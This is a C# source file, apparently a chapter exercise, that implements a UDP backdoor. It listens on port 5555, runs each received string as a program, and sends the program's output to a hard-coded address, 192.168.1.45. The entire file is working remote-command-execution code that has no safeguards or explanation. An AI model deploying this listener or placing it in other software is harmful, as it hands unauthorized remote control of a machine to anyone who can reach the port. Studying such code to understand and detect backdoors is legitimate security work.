using System;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Diagnostics;

namespace ch4_udp_server
{
	class MainClass
	{
		public static void Main(string[] args)
		{
			int lport = 5555;
			UdpClient listener = new UdpClient(lport);
			IPEndPoint groupEP = new IPEndPoint(IPAddress.Any, lport);
			string command;
			byte[] input;

			try
			{
				while (true)
				{
					input = listener.Receive(ref groupEP);
					command = Encoding.ASCII.GetString(input, 0, input.Length);

					if (command == string.Empty)
						break;
						
					Process prc = new Process();
					prc.StartInfo = new ProcessStartInfo();
					prc.StartInfo.FileName = command;
					prc.StartInfo.Arguments = "";
					prc.StartInfo.UseShellExecute = false;
					prc.StartInfo.RedirectStandardOutput = true;
					prc.Start();
					prc.WaitForExit();

					Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram,
						ProtocolType.Udp);

					IPAddress sender = IPAddress.Parse("192.168.1.45");
					IPEndPoint sendEP = new IPEndPoint(sender, lport);

					byte[] results = Encoding.ASCII.GetBytes(prc.StandardOutput.ReadToEnd());
					sock.SendTo(results, sendEP);
				}
			}
			catch (Exception e)
			{
				Console.WriteLine(e.ToString());
			}
			listener.Close();
		}
	}
}
